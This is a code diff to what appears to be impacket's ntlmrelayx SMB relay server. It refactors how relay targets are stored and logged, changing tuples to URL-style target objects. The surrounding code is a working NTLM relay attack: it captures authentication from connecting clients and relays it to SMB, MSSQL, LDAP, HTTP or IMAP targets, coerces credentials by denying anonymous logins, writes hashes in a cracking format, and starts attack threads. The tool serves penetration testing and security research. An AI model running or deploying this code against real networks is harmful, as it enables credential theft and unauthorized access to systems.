@@ -31,6 +31,7 @@ from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
 from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
 from impacket.spnego import ASN1_AID, MechTypes, ASN1_SUPPORTED_MECH
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
+from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.smbserver import getFileTime
 
 class SMBRelayServer(Thread):
@@ -90,11 +91,11 @@ class SMBRelayServer(Thread):
         connData = smbServer.getConnectionData(connId, checkStatus=False)
 
         if self.config.mode.upper() == 'REFLECTION':
-            self.target = ('SMB', connData['ClientIP'], 445)
+            self.target = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP']).getTarget()
 
         if self.config.mode.upper() == 'RELAY':
             # Get target from the processor
-            self.target = self.targetprocessor.get_target(connData['ClientIP'])
+            self.target = self.targetprocessor.getTarget()
 
         #############################################################
         # SMBRelay
@@ -106,21 +107,21 @@ class SMBRelayServer(Thread):
             del smbClient
             del smbData[self.target]
 
-        LOG.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'], self.target[1]))
+        LOG.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'], self.target.hostname))
 
         try:
             if self.config.mode.upper() == 'REFLECTION':
                 # Force standard security when doing reflection
                 LOG.info("Downgrading to standard security")
                 extSec = False
-                recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
+                #recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
             else:
                 extSec = True
             # Init the correct client for our target
             client = self.init_client(extSec)
         except Exception, e:
-            LOG.error("Connection against target %s FAILED: %s" % (self.target[1], str(e)))
-            self.targetprocessor.log_target(connData['ClientIP'], self.target)
+            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
+            self.targetprocessor.logTarget(self.target)
         else:
             smbData[self.target] = {}
             smbData[self.target]['SMBClient'] = client
@@ -253,7 +254,7 @@ class SMBRelayServer(Thread):
                 challengeMessage = self.do_ntlm_negotiate(client, token)
             except Exception, e:
                 # Log this target as processed for this client
-                self.targetprocessor.log_target(connData['ClientIP'], self.target)
+                self.targetprocessor.logTarget(self.target)
                 # Raise exception again to pass it on to the SMB server
                 raise
 
@@ -307,15 +308,17 @@ class SMBRelayServer(Thread):
 
             if errorCode != STATUS_SUCCESS:
                 #Log this target as processed for this client
-                self.targetprocessor.log_target(connData['ClientIP'],self.target)
-                LOG.error("Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                self.targetprocessor.logTarget(self.target)
+                LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
+                self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
+                authenticateMessage['user_name']))
                 client.killConnection()
             else:
                 # We have a session, create a thread and do whatever we want
-                LOG.info("Authenticating against %s as %s\%s SUCCEED" % (
-                self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
+                self.target.scheme, self.target.netloc, authenticateMessage['domain_name'], authenticateMessage['user_name']))
                 # Log this target as processed for this client
-                self.targetprocessor.log_target(connData['ClientIP'], self.target)
+                self.targetprocessor.logTarget(self.target, True)
 
                 ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                     authenticateMessage['user_name'],
@@ -356,13 +359,13 @@ class SMBRelayServer(Thread):
     def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
         connData = smbServer.getConnectionData(connId, checkStatus = False)
         if self.config.mode.upper() == 'REFLECTION':
-            self.target = ('SMB',connData['ClientIP'],445)
+            self.target = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP']).getTarget()
 
         if self.config.mode.upper() == 'RELAY':
             #Get target from the processor
             #TODO: Check if a cache is better because there is no way to know which target was selected for this victim
             # except for relying on the targetprocessor selecting the same target unless a relay was already done
-            self.target = self.targetprocessor.get_target(connData['ClientIP'])
+            self.target = self.targetprocessor.getTarget()
 
         #############################################################
         # SMBRelay
@@ -375,7 +378,7 @@ class SMBRelayServer(Thread):
             del smbClient
             del smbData[self.target]
 
-        LOG.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target[1]))
+        LOG.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target.hostname))
 
         try:
             if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
@@ -392,8 +395,8 @@ class SMBRelayServer(Thread):
             #Init the correct client for our target
             client = self.init_client(extSec)
         except Exception, e:
-            LOG.error("Connection against target %s FAILED: %s" % (self.target[1], str(e)))
-            self.targetprocessor.log_target(connData['ClientIP'],self.target)
+            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
+            self.targetprocessor.logTarget(self.target)
         else:
             smbData[self.target] = {}
             smbData[self.target]['SMBClient'] = client
@@ -452,7 +455,7 @@ class SMBRelayServer(Thread):
                     challengeMessage = self.do_ntlm_negotiate(client,token)
                 except Exception, e:
                     # Log this target as processed for this client
-                    self.targetprocessor.log_target(connData['ClientIP'],self.target)
+                    self.targetprocessor.logTarget(self.target)
                     # Raise exception again to pass it on to the SMB server
                     raise
 
@@ -489,7 +492,8 @@ class SMBRelayServer(Thread):
                     self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                                 authenticateMessage['user_name'].decode('utf-16le'))).upper()
 
-                    clientResponse, errorCode = self.do_ntlm_auth(client,sessionSetupData['SecurityBlob'],connData['CHALLENGE_MESSAGE']['challenge'])
+                    clientResponse, errorCode = self.do_ntlm_auth(client,sessionSetupData['SecurityBlob'],
+                                                                  connData['CHALLENGE_MESSAGE']['challenge'])
                 else:
                     # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                     errorCode = STATUS_ACCESS_DENIED
@@ -508,21 +512,23 @@ class SMBRelayServer(Thread):
                     packet['ErrorCode']   = errorCode >> 16
                     packet['ErrorClass']  = errorCode & 0xff
 
-                    LOG.error("Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
+                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
+                    authenticateMessage['user_name']))
 
                     #Log this target as processed for this client
-                    self.targetprocessor.log_target(connData['ClientIP'],self.target)
+                    self.targetprocessor.logTarget(self.target)
 
                     client.killConnection()
 
                     return None, [packet], errorCode
                 else:
                     # We have a session, create a thread and do whatever we want
-                    LOG.info("Authenticating against %s as %s\%s SUCCEED" % (
-                    self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
+                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'], authenticateMessage['user_name']))
 
                     # Log this target as processed for this client
-                    self.targetprocessor.log_target(connData['ClientIP'], self.target)
+                    self.targetprocessor.logTarget(self.target, True)
 
                     ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
                                                         authenticateMessage['user_name'],
@@ -578,7 +584,7 @@ class SMBRelayServer(Thread):
                 packet['ErrorClass']  = errorCode & 0xff
 
                 #Log this target as processed for this client
-                self.targetprocessor.log_target(connData['ClientIP'],self.target)
+                self.targetprocessor.logTarget(self.target)
 
                 # Finish client's connection
                 client.killConnection()
@@ -606,11 +612,11 @@ class SMBRelayServer(Thread):
 
     #Initialize the correct client for the relay target
     def init_client(self,extSec):
-        if self.config.protocolClients.has_key(self.target[0]):
-            client = self.config.protocolClients[self.target[0]](self.config, self.target[1], extendedSecurity = extSec)
+        if self.config.protocolClients.has_key(self.target.scheme.upper()):
+            client = self.config.protocolClients[self.target.scheme.upper()](self.config, self.target.hostname, extendedSecurity = extSec)
             client.initConnection()
         else:
-            LOG.error('Protocol Client for %s not found!' % self.target[0])
+            LOG.error('Protocol Client for %s not found!' % self.target.scheme)
 
         return client
 
@@ -626,25 +632,25 @@ class SMBRelayServer(Thread):
 
     def do_attack(self,client, connData=None):
         #Do attack. Note that unlike the HTTP server, the config entries are stored in the current object and not in any of its properties
-        if self.target[0] == 'SMB' or self.target[0] == 'MSSQL':
+        if self.target.scheme.upper() == 'SMB' or self.target.scheme.upper() == 'MSSQL':
             if self.config.runSocks is True:
                 # For now, we only support SOCKS for SMB and MSSQL, for now.
                 # Pass all the data to the socksplugins proxy
-                activeConnections.put((self.target[1], client.targetPort, self.authUser, client.session, client.sessionData))
-            elif self.target[0] == 'MSSQL':
+                activeConnections.put((self.target.hostname, client.targetPort, self.authUser, client.session, client.sessionData))
+            elif self.target.scheme == 'MSSQL':
                 clientThread = self.config.attacks['MSSQL'](self.config, client.session, self.authUser)
                 clientThread.start()
             else:
                 clientThread = self.config.attacks['SMB'](self.config, client.session, self.authUser)
                 clientThread.start()
 
-        if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
+        if self.target.scheme.upper() == 'LDAP' or self.target.scheme.upper() == 'LDAPS':
             clientThread = self.config.attacks['LDAP'](self.config, client.session, self.authUser)
             clientThread.start()
-        if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
+        if self.target.scheme.upper() == 'HTTP' or self.target.scheme.upper() == 'HTTPS':
             clientThread = self.config.attacks['HTTP'](self.config, client.session, self.authUser)
             clientThread.start()
-        if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
+        if self.target.scheme.upper() == 'IMAP' or self.target.scheme.upper() == 'IMAPS':
             clientThread = self.config.attacks['IMAP'](self.config, client.session, self.authUser)
             clientThread.start()
 
